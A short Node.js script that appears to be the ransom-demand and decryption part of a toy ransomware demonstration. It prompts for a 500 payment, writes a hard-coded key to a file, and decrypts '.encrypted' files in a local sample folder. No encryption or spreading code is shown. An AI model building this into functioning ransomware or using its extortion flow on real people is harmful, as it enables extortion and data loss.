const encryptor = require('file-encryptor');
const fs = require('fs');
const readline = require('readline');

const testFolder = './sample';
const ransomAmount = 500;
const decryptionKey = 'Marealie';

askForPayment();

function askForPayment() {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  rl.question('Enter the amount of payment to receive the decryption key: ', (amount) => {

    amount = amount.trim();
    const paymentConfirmation = parseFloat(amount) === ransomAmount;
    if (paymentConfirmation) {
      console.log('Payment confirmed. Sending decryption key...');
      sendDecryptionKey();
    } else {
      console.log('Payment not confirmed. Decryption key not sent.');
      rl.close();
    }
  });
}

function sendDecryptionKey() {
  fs.writeFileSync('./sample/decryption_key.txt', decryptionKey);
  console.log('Decryption key sent.');

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  rl.question('Enter the decryption key to decrypt the files: ', (inputKey) => {
   
    inputKey = inputKey.trim();
    
    if (inputKey === decryptionKey) {
      console.log('Decryption key is correct. Decrypting files...');
      decryptFiles();
    } else {
      console.log('Incorrect decryption key. Files cannot be decrypted.');
      rl.close();
    }
  });
}

function decryptFiles() {
  let encryptedFiles = fs.readdirSync(testFolder);
  encryptedFiles.forEach((file) => {
    if (file.endsWith('.encrypted')) {
      let decryptedFileName = file.slice(0, -'.encrypted'.length);
      encryptor.decryptFile(`${testFolder}/${file}`, `${testFolder}/${decryptedFileName}`, decryptionKey, function(err) {
        if (err) {
          console.error(`Error decrypting ${file}: ${err}`);
        } else {
          console.log(`File ${file} decrypted successfully!`);
          fs.unlinkSync(`${testFolder}/${file}`);
        }
      });
    }
  });
}
